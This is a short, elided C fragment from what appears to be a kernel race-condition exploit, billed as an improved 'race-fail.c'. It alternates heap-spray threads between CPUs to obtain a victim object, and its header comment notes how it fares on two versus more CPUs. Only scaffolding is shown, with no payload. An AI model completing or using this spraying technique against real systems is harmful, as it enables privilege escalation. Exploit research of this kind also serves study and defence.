/**
 * Improved version of race-fail.c
 *
 * - Runs the spray retrial on a different CPU.
 * - Alternates the initial CPU to start spraying from after a discarded
 *   candidate.
 *
 * Outperforms race-smp.c when SMP count is 2. It fails on higher SMP.
 */
...
int get_cpu_id(cpu_set_t *cpu_set) {
  int cpu_id = 0;
  if (CPU_ISSET(1, cpu_set)) {
    cpu_id = 1;
  }
  return cpu_id;
}
...
int spray_and_get_victim_object() {
  ...
  int cpu_id;
  while (victim_fd == -1) {
    if (t_cpu == NULL || t_cpu == &t2_cpu) 
      t_cpu = &t1_cpu;
    else
      t_cpu = &t2_cpu;
    cpu_id = get_cpu_id(t_cpu);
    printf("[+] spraying on CPU %d\n", cpu_id);
    pthread_create(&th1, NULL, spray_thread, (void*)t_cpu);
